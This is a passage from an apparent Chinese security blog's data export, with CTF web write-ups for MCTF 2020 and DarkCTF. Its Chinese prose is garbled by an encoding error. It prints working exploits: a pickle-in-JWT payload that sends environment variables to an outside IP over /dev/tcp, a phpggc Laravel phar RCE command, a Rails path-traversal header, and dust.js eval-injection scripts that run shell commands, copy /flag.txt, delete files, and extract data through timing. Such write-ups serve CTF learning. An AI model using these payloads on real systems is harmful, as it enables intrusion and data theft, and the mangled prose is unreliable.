ç™»å½•ä¼šå‘ç°cookieæ˜¯jwtå½¢å¼çš„ã€‚è€Œå…¶ä¸­payloadçš„ä¸€ä¸ªå€¼identityæ˜æ˜¾æ˜¯pickleåºåˆ—åŒ–åbase64çš„ç»“æœã€‚ é‚£ä¹ˆéœ€è¦keyæ¥ä¼ªé€ pickleåºåˆ—åŒ–æ•°å€¼è¿›è¡Œrceçˆ†ç ´å¾—åˆ°SecreT(æˆ‘ç»å¯¹ä¸ä¼šå†ç”¨åˆ°c-jwt-crackerçˆ†ç ´keyäº†ï¼Œæ•ˆæœå¥‡å·®ã€‚æ‰‹å†™python + rockyou.txt æ•ˆæœå¥½äº†ä¸çŸ¥é“å¤šå°‘å€) å› ä¸ºç¦æ­¢äº†os.system ä»¥åŠevalè¿™æ ·çš„å‡½æ•°ã€‚æ‰€ä»¥ç”¨subprocess.checkoutputå³å¯ exp 1234567891011121314151617181920from base64 import b64encodeimport pickleimport jwtclass exp(object): def __reduce__(self): cmd = ['bash', '-c', 'echo $(env) &gt; /dev/tcp/120.27.246.202/9001 '] return __import__('subprocess').check_output, (cmd,)e = exp()poc = b64encode(pickle.dumps(e)).decode()token='eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpYXQiOjE2MDE4MTE3NjQsIm5iZiI6MTYwMTgxMTc2NCwianRpIjoiOWU3YzYzOWYtZWVkZC00MzAxLWJkN2EtMmQ4ZDQxYWFjNTA0IiwiZXhwIjoxNjMzMzQ3NzY0LCJpZGVudGl0eSI6ImdBU1ZXZ0VBQUFBQUFBQ01EbkJyYkY5aGNIQXViVzlrWld4emxJd0VWWE5sY3BTVGxDbUJsSDJVS0l3U1gzTmhYMmx1YzNSaGJtTmxYM04wWVhSbGxJd1VjM0ZzWVd4amFHVnRlUzV2Y20wdWMzUmhkR1dVakExSmJuTjBZVzVqWlZOMFlYUmxsSk9VS1lHVWZaUW9qQWhwYm5OMFlXNWpaWlJvQTR3UFkyOXRiV2wwZEdWa1gzTjBZWFJsbEgyVWpBTnJaWG1VYUFKTHFvV1VUb2VVakF4c2IyRmtYMjl3ZEdsdmJuT1VqNVNNQm1Oc1lYTnpYNVJvQW93U1pYaHdhWEpsWkY5aGRIUnlhV0oxZEdWemxJK1VqQWxzYjJGa1gzQmhkR2lVWFpSb0FrNkdsR0dNQjIxaGJtRm5aWEtVakI1emNXeGhiR05vWlcxNUxtOXliUzVwYm5OMGNuVnRaVzUwWVhScGIyNlVqQkZmVTJWeWFXRnNhWHBsVFdGdVlXZGxjcFNUbENtQmxIMlVhQk5vQW5OaWRXS01DSEJoYzNOM2IzSmtsSXdETVRJemxJd0lkWE5sY201aGJXV1VqQWhoWkcxcGJqRXlNNVNNQW1sa2xFdXFkV0l1IiwiZnJlc2giOmZhbHNlLCJ0eXBlIjoiYWNjZXNzIn0.VBMiDwfU0EEaEIkq5GMH60THzvCb7QTWPEm-euvTQKs'key='SecreT'data=jwt.decode(token,verify=None)data['identity']=poctoken=jwt.encode(data,key=key,algorithm='HS256').decode()print(token)r=requests.get('http://dead-journal.mctf.online/',cookies=&#123;'access_token_cookie':token&#125;) flagåœ¨ç¯å¢ƒå˜é‡FLAG=MCTF{pl33Z_donT_u53_p1cKl13} 2in1åºåˆ—åŒ–åˆ†ç±»çš„phpååºåˆ—åŒ– æ¯”è¾ƒç¬¦åˆå®æˆ˜çš„é¢˜ç›®ã€‚æœ‰ä¸¤ç§æ–‡ä»¶ä¸Šä¼ æ–¹å¼ã€‚å…¶ä¸­ä¸€ä¸ªæ˜¯ç›´æ¥ä¸Šä¼ ã€‚è¿˜æœ‰ä¸€ç§åº”è¯¥æ˜¯file_get_contentsä¸Šä¼ .è¿™ä¸ªç¯å¢ƒæ˜¯laravelï¼Œè€Œä¸”å¯ä»¥æ¨æµ‹ä¸Šä¼ è·¯å¾„ã€‚åŠ ä¸Šåªæœ‰jpegçš„é™åˆ¶ï¼Œé‚£ä¹ˆå°±èƒ½å¤Ÿä¸Šä¼ pharå¹¶è¿›è¡Œè§¦å‘è¾¾æˆrce. phpggcçœŸå¥½ç”¨ã€‚ã€‚ã€‚ç›´æ¥ç”Ÿæˆrceçš„phar-&gt;jpegæ–‡ä»¶ã€‚ 1./phpggc -pj src_public_uploads_test.jpeg -o exp.jpeg Laravel/RCE1 system env ç„¶åphar:///app/public/uploads/YWGXnnP49J.jpegè§¦å‘ flag=mctf{better_than_w@r} Chatåºåˆ—åŒ–åˆ†ç±»çš„javaååºåˆ—åŒ–é¦–å…ˆç»™å‡ºæœåŠ¡ç«¯çš„ä¾èµ–ä»¥åŠä¸€ä¸ªjaråŒ…ã€‚åº”è¯¥æ˜¯jdk11çš„ç¯å¢ƒã€‚ä¸è¿‡åªæ˜¯ä¸€ä¸ªthin client. 1234567dependencies &#123; implementation 'org.springframework.boot:spring-boot-starter-websocket' compile group: 'com.esotericsoftware', name: 'kryo', version: '4.0.2' compile group: 'org.apache.xbean', name: 'xbean-naming', version: '4.17' compileOnly 'org.projectlombok:lombok' annotationProcessor 'org.projectlombok:lombok'&#125; ç›´æ¥èµ°åˆ°å…³é”®ç‚¹:æ‰¾writeObject ç„¶åå°±å¤§è‡´å¯ä»¥ç¡®è®¤æ˜¯kyroååºåˆ—åŒ–äº†ã€‚å…·ä½“åˆ©ç”¨æ–¹æ³•ä¸»è¦æ˜¯marshalsec + Xbeanä¾èµ–ç”Ÿæˆä¸€ä¸ªpayloadfile.ç„¶åç”¨ç±»ä¼¼jndiçš„æ–¹æ³•åŠ è½½æ¶æ„classæŠ›å‡ºError.åœ¨errorä¸­ååºåˆ—åŒ–ChatMessageç±»ä¸è¿‡å› ä¸ºæ²¡æœ‰æŒ‡å®šç±»ä»¥åŠä¸€äº›ç»†èŠ‚é—®é¢˜ã€‚è¿˜éœ€è¦é‡æ–°ç¼–è¯‘marshalsec.å…·ä½“å‚è€ƒhttps://gitlab.com/mctf/quals-2020/chat/-/blob/master/exploit/marshalsec.patchåŠ ä¸Šä¸€ä¸ªå†™æœ‰é™æ€æ–¹æ³•æŠ›å‡ºè¯»æ–‡ä»¶payloadçš„classå³å¯è¾¾æˆrce. æ•´ä½“ä¸Šæˆ‘è¿˜æ˜¯æœ‰å¾ˆå¤šé—®é¢˜â€¦â€¦ä¸è¿‡æ—¢ç„¶æºç éƒ½æœ‰äº†çš„è¯ä»¥åæ¥è§¦åˆ°kyroååºåˆ—åŒ–å†å›æ¥å¡«å‘ã€‚ railsååºåˆ—åŒ–ç±»çš„rubyååºåˆ—åŒ–åŸºæœ¬ä¸Šå°±æ˜¯å¯ä»¥ç”¨è¿™ä¸ªç›´æ¥æ‰“ã€‚ä¸è¿‡å› ä¸ºè¦æ±‚rubyç‰ˆæœ¬2.5.1å°±æ‡’å¾—æ‰“äº†ã€‚åŸºæœ¬æµç¨‹æ˜¯ä¸¤ä¸ªcveæ‰“ç»„åˆæ‹³ã€‚é¦–å…ˆCVE-2019-5418æ˜¯ä¸€ä¸ªè·¯å¾„ç©¿è¶Šçš„æ´ã€‚å¯ä»¥åœ¨headerä¸­è®¾ç½®Accept: ../../../../../../../../etc/passwdç©¿è¶Šè·¯å¾„è®¿é—®åˆ°æ–‡ä»¶ã€‚ç„¶åå¯ä»¥ä»»æ„è¯»äº†åå°±èƒ½è¯»åˆ°ååºåˆ—åŒ–çš„é…ç½®æ–‡ä»¶credentials.yml.enc ,master.key.è®¡ç®—å‡ºsecret_key_base åå°±èƒ½è®¿é—®æŒ‡å®šèµ„æºè¿›è¡Œååºåˆ—åŒ–rce.CVE-2019-5420https://github.com/mpgn/Rails-doubletap-RCE æœ€åè¿˜æ˜¯å†³å®šdockerèµ·äº†ä¸ª2.5.1çš„ç¯å¢ƒâ€¦â€¦ç„¶åç”¨è¿™ä¸ªexpæ—¶å…ˆbundle install (æ¢æº) + å®‰è£…nodejs + å»æ‰exploit.rbé‡Œçš„ä»£ç†å³å¯è¿è¡Œå¹¶åå¼¹shell flag:mctf{1_l0ve_rzhd","categories":[],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://www.bycsec.top/tags/CTF/"},{"name":"wp","slug":"wp","permalink":"https://www.bycsec.top/tags/wp/"}]},{"title":"DarkCTF-WEB","slug":"DarkCTF-WEB","date":"2020-09-25T11:27:48.000Z","updated":"2021-02-18T05:08:56.163Z","comments":true,"path":"2020/09/25/DarkCTF-WEB/","link":"","permalink":"https://www.bycsec.top/2020/09/25/DarkCTF-WEB/","excerpt":"å¥½ä¹…æ²¡å‘æ–°æ–‡ç« äº†ã€‚æ­£å¥½å›½åº†å°±è¦åˆ°äº†ï¼ŒåŠ ä¸Šè¿˜æœ‰å·…å³°æå®¢è·Ÿå›½èµ›è¦æ‰“ã€‚æ‰€ä»¥å‘¨äº”æ™šä¸Šç»ƒæ‰‹äº†DarkCTFçš„é¢˜ç›®ï¼Œç¨å¾®èŠ±äº†å‡ å°æ—¶akæ‰å½“æ—¶æ”¾å‡ºçš„webã€‚å…¶ä¸­å¤§éƒ¨åˆ†éƒ½æ¯”è¾ƒç®€å•ï¼Œå…¶ä¸­ä¸€é“æ‹¿äº†äºŒè¡€çš„nodejsé¢˜ç›®æœ‰ç‚¹æ„æ€æ‰“ç®—ç¨å¾®è®°å½•ä¸‹ã€‚","text":"å¥½ä¹…æ²¡å‘æ–°æ–‡ç« äº†ã€‚æ­£å¥½å›½åº†å°±è¦åˆ°äº†ï¼ŒåŠ ä¸Šè¿˜æœ‰å·…å³°æå®¢è·Ÿå›½èµ›è¦æ‰“ã€‚æ‰€ä»¥å‘¨äº”æ™šä¸Šç»ƒæ‰‹äº†DarkCTFçš„é¢˜ç›®ï¼Œç¨å¾®èŠ±äº†å‡ å°æ—¶akæ‰å½“æ—¶æ”¾å‡ºçš„webã€‚å…¶ä¸­å¤§éƒ¨åˆ†éƒ½æ¯”è¾ƒç®€å•ï¼Œå…¶ä¸­ä¸€é“æ‹¿äº†äºŒè¡€çš„nodejsé¢˜ç›®æœ‰ç‚¹æ„æ€æ‰“ç®—ç¨å¾®è®°å½•ä¸‹ã€‚ Sourceç»™äº†æºç è·Ÿç½‘é¡µï¼Œä¸»ä½“ä¸Šå°±æ˜¯ 1234567891011121314151617181920&lt;?php$web = $_SERVER['HTTP_USER_AGENT'];if (is_numeric($web))&#123; if (strlen($web) &lt; 4)&#123; if ($web &gt; 10000)&#123; echo ('&lt;div class=\"w3-panel w3-green\"&gt;&lt;h3&gt;Correct&lt;/h3&gt; &lt;p&gt;darkCTF&#123;&#125;&lt;/p&gt;&lt;/div&gt;'); &#125; else &#123; echo ('&lt;div class=\"w3-panel w3-red\"&gt;&lt;h3&gt;Wrong!&lt;/h3&gt; &lt;p&gt;Ohhhhh!!! Very Close &lt;/p&gt;&lt;/div&gt;'); &#125; &#125; else &#123; echo ('&lt;div class=\"w3-panel w3-red\"&gt;&lt;h3&gt;Wrong!&lt;/h3&gt; &lt;p&gt;Nice!!! Near But Far&lt;/p&gt;&lt;/div&gt;'); &#125;&#125; else &#123; echo ('&lt;div class=\"w3-panel w3-red\"&gt;&lt;h3&gt;Wrong!&lt;/h3&gt; &lt;p&gt;Ahhhhh!!! Try Not Easy&lt;/p&gt;&lt;/div&gt;');&#125;?&gt; å–UserAgentä½œä¸ºå‚æ•°ï¼Œåˆ¤æ–­äº†å­—ç¬¦ä¸²é•¿åº¦ä¸æ•°å€¼å¤§å°ã€‚ç®€å•ä½¿ç”¨ç§‘å­¦è®¡æ•°æ³•9E9å³å¯ç»•è¿‡ Apache Logsç»™äº†ä¸ªzipç„¶åè®©ä½ ä»é‡Œé¢çš„logæ–‡ä»¶é‡Œæ‰¾flag.ç®€å•æå–å‡ºå…¶ä¸­String.fromCharCodeéƒ¨åˆ†æ”¾åˆ°æµè§ˆå™¨consoleé‡Œè½¬ä¸€ä¸‹å³å¯ã€‚ä¸è¿‡æäº¤æ—¶è¦ç”¨darkCTFè€Œä¸æ˜¯DarkCTF So_Simpleå¼€å§‹æ²¡å•¥å¤´ç»ªã€‚åæ¥å‘ç°æç¤ºäº†ä¼ å‚id.äºæ˜¯å¾ˆç®€å•å°±èƒ½å‘ç°æ˜¯ä¸ªsqlæ³¨å…¥ã€‚ç”šè‡³åŸºæœ¬ä¸Šå°±æ˜¯sqli-labsçš„ç¬¬ä¸€å…³ã€‚unionæ³¨å…¥ä»usersè¡¨ä¸­çš„passwordé‡Œæ‰¾åˆ°æŸä¸ªflag. Simple_SQLç›´æ¥æç¤ºä¼ å‚id.æ™®é€šå¸ƒå°”ç›²æ³¨ã€‚æ²¡å•¥è¯´çš„ã€‚ Dusty Notesè¿™é¢˜èŠ±äº†ä¸€äº›æ—¶é—´ã€‚ä¸è¿‡åšå‡ºæ¥æ—¶æ‹¿äº†äºŒè¡€è¿˜æ˜¯æŒºèˆ’æœçš„ã€‚çœ‹åˆ°Defenitæ˜¯ä¸€è¡€ä¸çŸ¥é“æ˜¯ä¸æ˜¯åˆè¢«posixå¸ˆå‚…ç§’æ‰äº†ã€‚ï¼ˆposix nodejs æ°¸è¿œçš„ç¥ï¼‰ é¦–å…ˆé¢˜ç›®æ˜¯é»‘ç›’æµ‹è¯•çš„ã€‚è¿™ç‚¹å¯¹äºä¸€ä¸ªnodejsé¢˜ç›®æ¥è¯´å¢åŠ äº†ä¸å°‘éš¾åº¦ã€‚å¦‚æœæ˜¯æˆ‘å‡ºè¿™é¢˜å¯èƒ½å°±ç›´æ¥ç»™æºç äº†ã€‚ä½†æ˜¯åšå®Œåæˆ‘æ„Ÿè§‰è¿™ç§è®¾è®¡è¿˜æ˜¯å¾ˆè´´è¿‘ç°å®çš„ã€‚ä¹Ÿç»™äº†æˆ‘ä¸€å®šç¨‹åº¦ä¸Šé»‘ç›’æµ‹nodejsçš„æ‰‹æ®µã€‚ é¦–å…ˆé¢˜ç›®å¤§è‡´å®ç°äº†ä¸€ä¸ªnoteåŠŸèƒ½ã€‚å¯ä»¥é€šè¿‡addNotesè·¯ç”±ä¼ å‚messageã€‚é€šè¿‡deleteNote/{id}æ¥åˆ é™¤note.ä¸è¿‡ç®€å•çœ‹äº†ä¸‹cookieå‘ç°å†…å®¹å¯ä»¥ç”±cookieæ§åˆ¶ 12&#x2F;&#x2F;notej:[&#123;&quot;id&quot;:1,&quot;body&quot;:&quot;Hack this&quot;&#125;,&#123;&quot;id&quot;:2,&quot;body&quot;:&quot;1&quot;&#125;] åˆ°è¿™ä¸€æ­¥ä¸ºæ­¢æˆ‘æœ‰å‡ ç§æ€è·¯1.nodejsååºåˆ—åŒ–ã€‚2.åŸå‹é“¾æ±¡æŸ“3.ï¼Ÿï¼Ÿï¼Ÿ é¦–å…ˆæƒ³åˆ°nodejsååºåˆ—åŒ–æ˜¯å› ä¸ºä»¥å‰NahamconCTFè§£å‡ºçš„ä¸€é“nodeé¢˜ã€‚ä¹Ÿæ˜¯é»‘ç›’ã€‚ç„¶ååªæœ‰20å¤šè§£ã€‚ä½†æ˜¯æˆ‘å½“æ—¶æ˜¯æŠ±ç€è¯•ä¸€è¯•çš„å¿ƒæ€å°è¯•äº†ä¸‹ååºåˆ—åŒ–å±…ç„¶æˆåŠŸæ‹¿åˆ°shell.åæ¥å‘ç°ï¼Œä¹‹æ‰€ä»¥ä¼šæœ‰è¿™ç§æƒ³æ³•å°±æ˜¯å› ä¸º:æ•°æ®ä¸ºjsonä¸²ã€‚æ•°æ®ç”±cookieæ§åˆ¶åºåˆ—åŒ–è¾“å‡ºçš„ç»“æœå°±æ˜¯jsonä¸²,æ‰€ä»¥é»‘ç›’ä¸‹å°è¯•node-serializeæœªå°ä¸å¯ã€‚å½“ç„¶æœ¬é¢˜è‡ªç„¶æ˜¯å¤±è´¥äº†ã€‚å› æ­¤æ–¹æ³•ä¹Ÿä¸å†å¤šè¯´ã€‚ ç¬¬äºŒç§æƒ³æ³•è‡ªç„¶æ˜¯å› ä¸ºnodejsä¸­æƒ³è¦å‡ºç°åŸå‹é“¾æ±¡æŸ“å®åœ¨æ˜¯å¤ªå®¹æ˜“äº†ã€‚ä¸è¿‡æœ‰ä¸€è¯´ä¸€ä¸€é“ä»¥åŸå‹é“¾æ±¡æŸ“ä¸ºæ¼æ´çš„ctfé¢˜ä½¿ç”¨å…¬å…±é¶æœºæ˜¯éå¸¸ä¸å¦¥çš„ï¼Œå¹¶ä¸”ä¸€èˆ¬æ˜¯ç»™å‡ºæºç è¿›è¡Œæµ‹è¯•ã€‚åŠ ä¸Šæ­¤å¤„å¹¶æ²¡æœ‰ä»€ä¹ˆæ˜¾çœ¼çš„æ¨¡æ¿ä½¿ç”¨æ¯”å¦‚ejsã€‚å› æ­¤æ˜¯åŸå‹é“¾æ±¡æŸ“çš„å¯èƒ½æ€§ä¹Ÿä¸å¤§ã€‚ æ­¤æ—¶åŸºæœ¬ä¸Šå¸¸è§„çš„æ€è·¯å·²ç»èµ°ä¸é€šäº†ã€‚ä½†æ˜¯æˆ‘ç®€å•fuzzäº†ä¸€ä¸‹ 12addNotes?note[]&#x3D;1addNotes?note[toString]&#x3D;1 å‘ç°å®ƒæ˜¯æ²¡æœ‰åšåªèƒ½ä¼ å­—ç¬¦ä¸²çš„é™åˆ¶çš„ã€‚ä¸€èˆ¬æ¥è¯´ï¼Œä¸å¯¹å‚æ•°ç±»å‹åšé™åˆ¶æ—¶ï¼Œæˆ‘ä»¬å¯ä»¥ä¼ å…¥æ•°ç»„æˆ–å¯¹è±¡ã€‚å› æ­¤åœ¨ä¼ å…¥å¯¹è±¡æ—¶è¿™é‡Œä¼šè§¦å‘æŠ¥é”™ã€‚ç„¶åé‡ç‚¹å°±æ¥äº†ï¼Œè§¦å‘çš„æŠ¥é”™å†…å®¹å¦‚ä¸‹ 1&#123;&quot;stack&quot;:&quot;TypeError: Cannot convert object to primitive value\\n at Tap.head (&#x2F;app&#x2F;node_modules&#x2F;dustjs-helpers&#x2F;lib&#x2F;dust-helpers.js:121:25)\\n at Tap.go (&#x2F;app&#x2F;node_modules&#x2F;dustjs-linkedin&#x2F;lib&#x2F;dust.js:812:19)\\n at Chunk.write (&#x2F;app&#x2F;node_modules&#x2F;dustjs-linkedin&#x2F;lib&#x2F;dust.js:556:19)\\n at Chunk.reference (&#x2F;app&#x2F;node_modules&#x2F;dustjs-linkedin&#x2F;lib&#x2F;dust.js:611:19)\\n at body_4 (evalmachine.&lt;anonymous&gt;:1:1634)\\n at Chunk.render (&#x2F;app&#x2F;node_modules&#x2F;dustjs-linkedin&#x2F;lib&#x2F;dust.js:598:12)\\n at Object.tap (&#x2F;app&#x2F;node_modules&#x2F;dustjs-helpers&#x2F;lib&#x2F;dust-helpers.js:123:8)\\n at Object.if (&#x2F;app&#x2F;node_modules&#x2F;dustjs-helpers&#x2F;lib&#x2F;dust-helpers.js:213:27)\\n at Chunk.helper (&#x2F;app&#x2F;node_modules&#x2F;dustjs-linkedin&#x2F;lib&#x2F;dust.js:769:34)\\n at body_1 (evalmachine.&lt;anonymous&gt;:1:972)\\n at Chunk.section (&#x2F;app&#x2F;node_modules&#x2F;dustjs-linkedin&#x2F;lib&#x2F;dust.js:654:21)\\n at body_0 (evalmachine.&lt;anonymous&gt;:1:847)\\n at &#x2F;app&#x2F;node_modules&#x2F;dustjs-linkedin&#x2F;lib&#x2F;dust.js:122:11\\n at processTicksAndRejections (internal&#x2F;process&#x2F;task_queues.js:79:11)&quot;,&quot;message&quot;:&quot;Cannot convert object to primitive value&quot;&#125; çˆ†å‡ºäº†å½“å‰è·¯å¾„/appä»¥åŠä¸€ä¸ªä¾èµ–dustjs-linkedin/lib/dust.js(è¿™é‡Œå¤šå˜´ä¸€å¥ï¼Œè¿™é‡Œä¸€å¼€å§‹defenitæ‹¿åˆ°ä¸€è¡€åé•¿è¾¾4ä¸ªå¤šå°æ—¶éƒ½æ²¡æœ‰å…¶ä»–è§£ï¼Œå¹¶ä¸”å½“æ—¶è§¦å‘æŠ¥é”™æ—¶é¢˜ç›®åªä¼šçˆ†500è€Œä¸æ˜¯åƒä¸Šé¢è¿™æ ·æ‰“å°æŠ¥é”™traceback,åæ¥æ”¹äº†é¢˜æ‰æœ‰äº†è¿™ä¸ªæŠ¥é”™æ ˆ) çœ‹åˆ°è¿™ä¸ªduståŠ ä¸Šé¢˜ç›®åä¸­çš„dustï¼Œå»æœç´¢ä¸€æ³¢çš„è¯ä¸éš¾å‘ç°å­˜åœ¨ä¸€ä¸ªæ¼æ´å¹¶ä¸”æœ‰æ–‡ç« åœ¨å®æˆ˜ä¸­é‡åˆ°è§£å†³https://artsploit.blogspot.com/2016/08/pprce2.html ç®€å•è¯´å°±æ˜¯ï¼Œdustçš„æ¨¡æ¿ä¼šè¿›å…¥ä¸€ä¸ªifè¯­å¥æ‰§è¡Œevalã€‚ä½†æ˜¯å¦‚æœæˆ‘ä»¬ç›´æ¥ä¼ å…¥å‚æ•°æ—¶å®ƒä¼šæŠŠæ•æ„Ÿå­—ç¬¦åšå¤„ç†ï¼Œè€Œå¦‚æœä¼ å…¥æ•°ç»„æ—¶åˆ™ä¸ä¼šå¤„ç†æ•æ„Ÿå­—ç¬¦ï¼Œå³å¯rceã€‚ å†å¤šå˜´ä¸€å¥ï¼Œåˆ°ç¡®å®šæ˜¯dustçš„æ´è¿™ä¸€æ­¥æˆ‘æœ¬æ¥ä»¥ä¸ºå¼¹ä¸ªshellå°±å®Œäº‹äº†ã€‚ç»“æœæµ‹äº†å¥½ä¹…å‘ç°ä¸çŸ¥é“æ˜¯ä¸é€šå¤–ç½‘è¿˜æ˜¯æ²¡èƒ½æ‰§è¡Œã€‚å·®ç‚¹ä»¥ä¸ºæ‰¾é”™æ´äº†ã€‚ç›´åˆ°ä»–æ”¹äº†é¢˜æ‰å‘ç°dustä¾èµ–ç¡®è®¤æ²¡æ‰¾é”™æ´ï¼Œä¸“å¿ƒæµ‹ä¸‹å»çš„ã€‚å½“ç„¶æ²¡æœ‰æŠ¥é”™æˆ‘ä»¬ä¹Ÿæœ‰å‡ ç§åŠæ³•ç¡®è®¤æ­¤å¤„å­˜åœ¨dustçš„evalæ¼æ´æ¯”å¦‚ 1addNotes?message&#x3D;aaa%5C ä¼šå¯¼è‡´ 1eval(&quot;&#39;xxx\\&#39; &#x3D;&#x3D; &#39;desktop&#39;&quot;); è§¦å‘æŠ¥é”™å†æ¯”å¦‚ 1addNotes?message[]&#x3D;&amp;message[]&#x3D;y%27-console.log(7) ä¹Ÿä¼šæŠ¥é”™ã€‚å› ä¸ºæˆ‘ä»¬æ­¤æ—¶å¼•å·æ²¡æœ‰è¢«è½¬ä¹‰ç›´æ¥é€å…¥eval.è§¦å‘æŠ¥é”™ã€‚æ‰€ä»¥ï¼Œå¦‚æœæœ‰ç€è‰¯å¥½çš„FUZZæ‰‹æ®µï¼Œé»‘ç›’ä¹Ÿå¯ä»¥fuzzå‡ºé—®é¢˜å¹¶ç¡®è®¤ä¾èµ–é”™è¯¯ã€‚ æœ€åï¼Œæˆ‘ä»¬ä½¿ç”¨evalè¯­å¥å‘½ä»¤æ‰§è¡Œã€‚å½“ç„¶å› ä¸ºä¸é€šå¤–ç½‘æ²¡æœ‰å›æ˜¾æ‰€ä»¥éå¸¸ç‹—ã€‚æˆ‘æœ€åé€‰æ‹©æŠŠç»“æœå†™é™æ€æ–‡ä»¶ã€‚å¹¶ä¸”è¿™é‡Œé™æ€ç›®å½•æ˜¯çŒœäº†ä¸€æ‰‹publicã€‚æ‰€ä»¥å¯ä»¥ç›´æ¥å†™/proc/self/cwd/public/css/style.cssæˆ–è€…åœ¨çˆ†å‡ºæ˜¯appç›®å½•åç›´æ¥å†™/app/public/cssexp 12345678910url=\"http://dusty.darkarmy.xyz/\"data=\"\"\"j:[&#123;\"id\":1,\"body\": [\"1\",\"1'-console.log(require('child_process').exec('cat /flag.txt &gt; /app/public/css/style.css').toString());//\"]&#125;]\"\"\"print(quote(data))r=requests.get(url,cookies=&#123;'note':quote(data)&#125;)print(r.text)r=requests.get(url+'css/style.css')print(r.text)data=\"\"\"j:[&#123;\"id\":1,\"body\": [\"1\",\"1'-console.log(require('child_process').exec('rm /app/public/css/style.css').toString());//\"]&#125;]\"\"\"print(quote(data))r=requests.get(url,cookies=&#123;'note':quote(data)&#125;) cookieå¯æ§æ‰€æœ‰å†…å®¹ä¸Šé¢è¯´è¿‡äº†ã€‚åªä¸è¿‡æµ‹è¯•æ—¶å› ä¸ºè·¯ç”±å¥½ç”¨å°±æ²¡æ§cookie. åšå‡ºæ¥åé—®äº†ä¸‹å‡ºé¢˜äººæœç„¶ä¸æ˜¯é¢„æœŸã€‚å½“ç„¶è¿™é‡Œæˆ‘ä¸å¤ªç¡®å®šé¢„æœŸæ˜¯å•¥ï¼Œä¸è¿‡å·®çš„åº”è¯¥ä¸å¤šã€‚å½“ç„¶èŠå®Œåå‡ºé¢˜äººé¡ºæ‰‹ä¿®äº†ä¸‹å†™æ–‡ä»¶çš„æƒé™ :ï¼‰ç„¶åå°±æ˜¯è¿™ç§åšæ³•æˆ‘è‡ªå·±ä¹Ÿä¸æ˜¯å¾ˆå–œæ¬¢ã€‚è‡ªå·±å‡ºè¿‡çš„nodejsé¢˜ç›®åœ¨å¯ä»¥rceçš„æƒ…å†µä¸‹æˆ‘éƒ½æŠŠå·¥ä½œç›®å½•æŒ‰rootæƒé™è®¾ç½®ã€‚å°±æ˜¯ä¸ºäº†é˜²æ­¢å†™æ–‡ä»¶ã€‚ä¸è¿‡ä¸€èˆ¬ä¼šé…ç½®äº†é˜²æ­¢æ—¶é—´ç›²æ³¨ï¼Œæ‰€ä»¥éƒ½ä¼šç»™å‡ºrceçš„å›æ˜¾ æ‰€ä»¥è¿™é‡ŒçŒœä¸€æ‰‹æœ¬é¢˜é¢„æœŸçš„æ–¹æ³•æ˜¯time-based-rce:exp 12345678910111213141516171819202122232425262728import timeimport requestsfrom urllib.parse import quote,unquoteimport stringurl=\"http://dusty.darkarmy.xyz/\"def js_exp(str1): x=[] str1 = str1.strip(' ') for ch in str1: x.append(str(ord(ch))) t=','.join(x) result='eval(String.fromCharCode('+t+'))' return resultflag=\"\"for num in range(1,50): print(num) for i in string.printable: cmd = \"\"\"require('child_process').execSync(`if [ $(cat /flag.txt | cut -c &#123;&#125;) = '&#123;&#125;' ];then sleep 3;fi`)\"\"\".format(num,i) payload = js_exp(cmd) data = \"\"\"j:[&#123;\"id\":1,\"body\": [\"1\",\"1'-\"\"\" + payload + \"\"\";//\"]&#125;]\"\"\" t = time.time() r = requests.get(url, cookies=&#123;'note': quote(data)&#125;) if time.time() - t &gt; 3: flag += i print(flag) break flag:darkCTF{n0d3js_l1br4r13s_go3s_brrrr!} å› ä¸ºä¸€äº›æ ¼å¼åŸå› ã€‚æˆ‘æŠŠpayloadç”¨evalè½¬åŒ–äº†ä¸€ä¸‹ï¼Œè¿™æ ·çœ‹èµ·æ¥æ›´èˆ’æœä¸€äº›.å¹¶ä¸”ä¸ç”¨æ‹…å¿ƒå¥‡å¥‡æ€ªæ€ªçš„å¼•å·é—®é¢˜ :) ä¸è¿‡é¢˜ç›®æˆ‘è§‰å¾—å¾ˆæœ‰å¯å‘æ€§ï¼Œä¸»è¦æ˜¯ç»™äº†æˆ‘ä¸€äº›é¢å¯¹nodejsé»‘ç›’å¤„ç†çš„æ‰‹æ®µã€‚é‚£å°±æ˜¯åˆ©ç”¨å…¶å®¹æ˜“æŠ¥é”™çš„ç‰¹æ€§è¿›è¡ŒFUZZï¼Œå¾—åˆ°ç›®å½•è¿™æ ·çš„å…³é”®ä¿¡æ¯ï¼Œæˆ–è€…æ˜¯ä¾èµ–çš„å…³é”®ä¿¡æ¯ã€‚åŒæ—¶ä¸€å®šç¨‹åº¦ä¸Šå¯ä»¥æ¨æµ‹è¯­å¥ï¼Œç”šè‡³ä¸éœ€è¦çŸ¥é“ä¾èµ–æ¼æ´çš„ç»†èŠ‚å°±èƒ½ç›´æ¥ä¸Šæ‰‹ã€‚ æœ€åé“ä¸ªæ­‰ï¼Œå› ä¸ºæŠŠflagå†™åˆ°cssé‡Œåè‡ªå·±å°±æŠŠcssç»™åˆ äº†ã€‚å¯¼è‡´åé¢é¢˜ç›®ä¸€ç›´æ²¡æœ‰style.cssâ€¦â€¦ summaryåé¢çš„é¢˜åœ¨æ‰“å·…å³°æå®¢æ‘¸é±¼æ—¶çœ‹äº†çœ‹ã€‚åšäº†ä¸ªå…¥é—¨é¢˜è·Ÿä¸€ä¸ªUser-Agentçš„æŠ¥é”™æ³¨å…¥ã€‚æ€»ä¹‹éš¾åº¦æ•´ä½“å¾ˆå…¥é—¨å°±æ²¡ç»§ç»­çœ‹äº†ã€‚æ²¡å•¥è¯´çš„ã€‚å·…å³°æå®¢ä½“éªŒäº†ä¸€æŠŠå¸¦é£çš„æ„Ÿè§‰ã€‚å›½èµ›å°±è¦é è‡ªå·±åŠ¨æ‰‹ä¸°è¡£è¶³é£Ÿäº†ã€‚åŠ æ²¹å§ã€‚","categories":[],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://www.bycsec.top/tags/CTF/"},{"name":"WEB","slug":"WEB","permalink":"https://www.bycsec.top/tags/WEB/"},{"name":"wp","slug":"wp","permalink":"https://www.bycsec.top/tags/wp/"}]},{"title":"é’“é±¼åŸ-zblog","slug":"é’“é±¼åŸ-zblog","date":"2020-08-27T12:44:43.000Z","updated":"2021-02-18T05:08:32.118Z","comments":true,"path":"2020/08/27/é’“é±¼åŸ-zblog/","link":"","permalink":"https://www.bycsec.top/2020/08/27/%E9%92%93%E9%B1%BC%E5%9F%8E-zblog/","excerpt":"æœ€è¿‘å¿™ç€å¤ä¹ 